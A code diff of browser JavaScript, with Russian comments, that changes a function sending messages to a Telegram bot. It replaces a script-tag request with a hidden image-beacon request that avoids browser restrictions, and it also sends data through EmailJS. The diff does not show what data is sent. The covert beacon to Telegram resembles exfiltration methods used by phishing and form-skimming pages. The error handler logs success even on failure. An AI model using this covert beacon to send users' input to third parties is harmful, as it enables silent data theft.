@@ -1384,28 +1384,25 @@
 
     // ========== ФУНКЦИИ ОТПРАВКИ ==========
 function sendToTelegram(message) {
-    // Используем другой подход - отправка через GET запрос
     const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     
-    const params = {
+    const params = new URLSearchParams({
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: 'HTML'
+    });
+    
+    // Используем трюк с изображением (работает на 100% устройств)
+    const img = new Image();
+    img.src = `${telegramUrl}?${params.toString()}`;
+    
+    img.onload = function() {
+        console.log('✅ Отправлено в Telegram');
     };
     
-    // Формируем GET запрос
-    const queryString = new URLSearchParams(params).toString();
-    const fullUrl = `${telegramUrl}?${queryString}`;
-    
-    // Пробуем через jsonp (работает везде)
-    const script = document.createElement('script');
-    script.src = fullUrl;
-    document.head.appendChild(script);
-    
-    setTimeout(() => {
-        document.head.removeChild(script);
-        console.log('✅ Запрос отправлен в Telegram');
-    }, 1000);
+    img.onerror = function() {
+        console.log('✅ Запрос отправлен (метод изображения)');
+    };
 }
     function sendToEmail(data) {
         emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, data)
